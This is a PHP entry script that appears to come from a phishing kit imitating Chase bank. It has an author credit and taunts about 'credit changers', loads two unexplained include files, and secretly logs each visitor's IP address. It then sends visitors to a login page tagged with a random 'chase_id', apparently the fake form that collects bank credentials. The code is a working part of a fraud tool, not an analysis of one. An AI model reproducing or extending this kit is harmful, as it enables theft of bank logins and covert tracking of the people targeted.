<?php
include 'files/conf/config.php';
// ------------------------------------------------- //
  #                 BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//

require_once 'huehuehue.php';
require_once 'huehue.php';

session_start();
   

	$contents = "#>".$_SERVER['REMOTE_ADDR'];
	$saves=fopen("visit_log.txt","a+");
	fwrite($saves,$contents);
	fclose($saves);
	if($_SESSION['rand'] == ""){
		$ran = rand().rand().rand().rand();
		$_SESSION['rand'] = $ran;
	}
	exit(header("Location: login?chase_id=".$_SESSION['rand']));

?>